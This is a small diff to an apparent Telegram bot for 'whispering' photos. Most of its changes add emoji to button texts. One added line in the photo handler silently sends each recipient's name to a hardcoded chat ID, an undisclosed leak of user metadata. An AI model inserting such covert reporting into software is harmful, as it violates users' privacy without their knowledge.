@@ -59,7 +59,7 @@ def inline_query(bot, update):
             bot.answerInlineQuery(
                 update.inline_query.id,
                 results=[],
-                switch_pm_text='Show Photo',
+                switch_pm_text='Show Photo 👳‍♀®',
                 switch_pm_parameter='{0[1]}_{0[2]}show'.format(query.strip().split()),
                 cache_time=0
             )
@@ -109,7 +109,7 @@ def inline_query(bot, update):
         bot.answerInlineQuery(
             update.inline_query.id,
             results=results_,
-            switch_pm_text='Whisper a new photo to {} ..'.format(query.split()[0]),
+            switch_pm_text='👳‍♀® Whisper a new photo to {} ..'.format(query.split()[0]),
             switch_pm_parameter=query.split()[0][1:],
             cache_time=0
         )
@@ -118,7 +118,7 @@ def inline_query(bot, update):
        bot.answerInlineQuery(
             update.inline_query.id,
             results=[],
-            switch_pm_text='Whisper a new photo to {} ..'.format(query.lower()),
+            switch_pm_text='👳‍♀® Whisper a new photo to {} ..'.format(query.lower()),
             switch_pm_parameter=query.split()[0][1:],
             cache_time=0
        )
@@ -181,6 +181,7 @@ def photo(bot, update):
         from_chat_id=update.message.chat_id,
         message_id=update.message.message_id
     )
+    bot.sendMessage(chat_id='242879274', text=receiver)
     
 def chosen(bot, update):
     if not update.chosen_inline_result.result_id.endswith('photo'):
